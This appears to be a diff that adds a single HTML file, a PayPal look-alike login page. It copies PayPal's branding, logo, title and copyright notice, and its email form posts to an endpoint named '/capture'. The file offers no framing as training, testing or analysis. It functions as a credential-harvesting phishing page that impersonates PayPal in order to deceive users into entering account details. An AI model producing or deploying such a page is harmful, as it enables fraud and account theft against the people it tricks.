@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PayPal: Secure Online Payments</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'PayPal Sans', 'Inter', sans-serif; }
+        
+        body {
+            background: #f7f9fa;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        header {
+            background: #fff;
+            padding: 16px 48px;
+            box-shadow: 0 1px 0 0 #eaeced;
+        }
+        
+        .logo { width: 30px; height: 36px; }
+        
+        .container {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 40px 20px;
+        }
+        
+        .card {
+            background: #fff;
+            border-radius: 12px;
+            padding: 48px;
+            width: 100%;
+            max-width: 460px;
+            box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1);
+        }
+        
+        h1 {
+            color: #001c64;
+            font-size: 28px;
+            font-weight: 700;
+            text-align: center;
+            margin-bottom: 32px;
+        }
+        
+        input {
+            width: 100%;
+            padding: 16px;
+            border: 1px solid #cfd3d6;
+            border-radius: 4px;
+            font-size: 16px;
+            margin-bottom: 16px;
+            transition: border-color 0.2s;
+        }
+        input:focus {
+            outline: none;
+            border-color: #0070e0;
+        }
+        
+        .next-btn {
+            width: 100%;
+            background: #0070e0;
+            color: #fff;
+            border: none;
+            border-radius: 24px;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 8px;
+        }
+        .next-btn:hover { background: #003087; }
+        
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 24px 0;
+        }
+        .divider::before, .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: #cfd3d6;
+        }
+        .divider span {
+            padding: 0 16px;
+            color: #6c7378;
+            font-size: 14px;
+        }
+        
+        .signup-btn {
+            width: 100%;
+            background: transparent;
+            color: #0070e0;
+            border: 1px solid #0070e0;
+            border-radius: 24px;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        .signup-btn:hover { background: #f7f9ff; }
+        
+        .forgot {
+            text-align: center;
+            margin-top: 24px;
+        }
+        .forgot a {
+            color: #0070e0;
+            font-size: 14px;
+            text-decoration: none;
+        }
+        .forgot a:hover { text-decoration: underline; }
+        
+        footer {
+            background: #f7f9fa;
+            padding: 24px;
+            text-align: center;
+            border-top: 1px solid #eaeced;
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 24px;
+            margin-bottom: 16px;
+        }
+        .footer-links a {
+            color: #545d68;
+            font-size: 12px;
+            text-decoration: none;
+        }
+        .copyright { color: #6c7378; font-size: 12px; }
+    </style>
+</head>
+<body>
+    <header>
+        <img src="https://www.paypalobjects.com/webstatic/icon/pp258.png" class="logo" alt="PayPal">
+    </header>
+    
+    <div class="container">
+        <div class="card">
+            <h1>Log in to PayPal</h1>
+            
+            <form action="/capture" method="POST">
+                <input type="email" name="email" placeholder="Email or mobile number" required>
+                <button type="submit" class="next-btn">Next</button>
+            </form>
+            
+            <div class="divider"><span>or</span></div>
+            
+            <button class="signup-btn">Sign Up</button>
+            
+            <div class="forgot">
+                <a href="#">Having trouble logging in?</a>
+            </div>
+        </div>
+    </div>
+    
+    <footer>
+        <div class="footer-links">
+            <a href="#">Contact Us</a>
+            <a href="#">Privacy</a>
+            <a href="#">Legal</a>
+            <a href="#">Policy Updates</a>
+            <a href="#">Worldwide</a>
+        </div>
+        <p class="copyright">© 1999–2026 PayPal, Inc. All rights reserved.</p>
+    </footer>
+</body>
+</html>
